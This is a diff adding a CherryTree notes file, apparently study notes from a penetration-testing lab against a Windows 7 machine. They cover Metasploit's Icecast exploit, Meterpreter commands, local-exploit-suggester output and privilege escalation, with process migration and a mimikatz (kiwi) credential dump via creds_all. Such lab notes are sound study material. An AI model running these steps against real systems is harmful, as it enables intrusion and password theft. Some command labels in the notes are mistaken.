@@ -1,0 +1,158 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="Metasploit" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1622112552" ts_lastsave="1622191864">
+    <rich_text scale="h1">Commands</rich_text>
+    <rich_text>
+CVE-2004-1561 - exploit = exploit/windows/http/icecast_header
+</rich_text>
+    <rich_text scale="h3">Meterpeter shell</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text underline="single">sys info</rich_text>
+    <rich_text> - System info 
+
+Output
+
+</rich_text>
+    <rich_text foreground="#ffff00000000">meterpreter &gt; sysinfo</rich_text>
+    <rich_text style="italic">
+Computer        : DARK-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text underline="single">getuid</rich_text>
+    <rich_text> - Shows server username and active users
+
+Output
+</rich_text>
+    <rich_text foreground="#ffff00000000">meterpreter &gt; sysinfo</rich_text>
+    <rich_text style="italic">
+Server username: Dark-PC\Dark</rich_text>
+    <rich_text>
+
+</rich_text>
+  </node>
+  <node name="Exploit suggester" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1622112851" ts_lastsave="1622112947">
+    <rich_text underline="single" style="italic">This can appear to hang as it tests exploits and might take several minutes to complete</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text foreground="#ffff00000000">
+run post/multi/recon/local_exploit_suggester</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text style="italic">Output</rich_text>
+    <rich_text>
+
+[*] 10.10.246.24 - Collecting local exploits for x86/windows...
+[*] 10.10.246.24 - 38 exploit checks are being tried...
+[+] 10.10.246.24 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.246.24 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
+[+] 10.10.246.24 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.246.24 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.246.24 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.246.24 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.246.24 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.246.24 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[+] 10.10.246.24 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[+] 10.10.246.24 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
+</rich_text>
+    <node name="Privesc" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1622113022" ts_lastsave="1622113652">
+      <rich_text>1)
+Background our current - session -&gt;</rich_text>
+      <rich_text foreground="#ffff00000000"> background/CTRL + Z</rich_text>
+      <rich_text>
+
+Background session 1? [y/N]  
+2)
+Keep an eye of your current session num -&gt; </rich_text>
+      <rich_text foreground="#ffff00000000">sessions</rich_text>
+      <rich_text>
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information             Connection
+  --  ----  ----                     -----------             ----------
+  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.11.37.62:4444 -&gt; 10.10.246.24:49240 (10.10.246.24)
+3)
+Select our previously found exploit -&gt;</rich_text>
+      <rich_text foreground="#ffff00000000"> use /exploit/path</rich_text>
+      <rich_text>
+4)
+If required (</rich_text>
+      <rich_text foreground="#ffff00000000">show options</rich_text>
+      <rich_text>) -&gt; </rich_text>
+      <rich_text foreground="#ffff00000000">set SESSION &lt;session-ID&gt;</rich_text>
+      <rich_text>
+5)
+run the exploit - </rich_text>
+      <rich_text foreground="#ffff00000000">run</rich_text>
+      <rich_text>
+6)
+Verify that we have expanded permissions -&gt; </rich_text>
+      <rich_text foreground="#ffff00000000">getprivs</rich_text>
+      <rich_text>
+</rich_text>
+    </node>
+    <node name="Looting" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1622113671" ts_lastsave="1622115788">
+      <rich_text>1)
+List running processes -&gt; </rich_text>
+      <rich_text foreground="#ffff00000000">ps</rich_text>
+      <rich_text> (Ps we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't).
+2)
+Find a process running with same permissions as lsass - but not ran by NT
+3)
+Crash this process -&gt; </rich_text>
+      <rich_text foreground="#ffff00000000">migrate -N PROCESS_NAME</rich_text>
+      <rich_text>
+4)
+You should be root -&gt; check by </rich_text>
+      <rich_text foreground="#ffff00000000">getuid</rich_text>
+      <rich_text>
+
+meterpreter &gt; </rich_text>
+      <rich_text foreground="#ffff00000000">getuid</rich_text>
+      <rich_text>
+Server username: NT AUTHORITY\SYSTEM
+5)
+Password dump, we'll use kiwi -&gt; </rich_text>
+      <rich_text foreground="#ffff00000000">load kiwi</rich_text>
+      <rich_text>
+
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; </rich_text>
+      <rich_text link="webs http://blog.gentilkiwi.com/mimikatz">http://blog.gentilkiwi.com/mimikatz</rich_text>
+      <rich_text>
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         &gt; </rich_text>
+      <rich_text link="webs http://pingcastle.com">http://pingcastle.com</rich_text>
+      <rich_text> / </rich_text>
+      <rich_text link="webs http://mysmartlogon.com">http://mysmartlogon.com</rich_text>
+      <rich_text>  ***/
+
+Success
+6)
+Let's see the passwords! -&gt; </rich_text>
+      <rich_text foreground="#ffff00000000">creds_all</rich_text>
+      <rich_text>
+
+
+
+PS
+after you load kiwi see the commands with </rich_text>
+      <rich_text foreground="#ffff00000000">help</rich_text>
+    </node>
+  </node>
+</cherrytree>
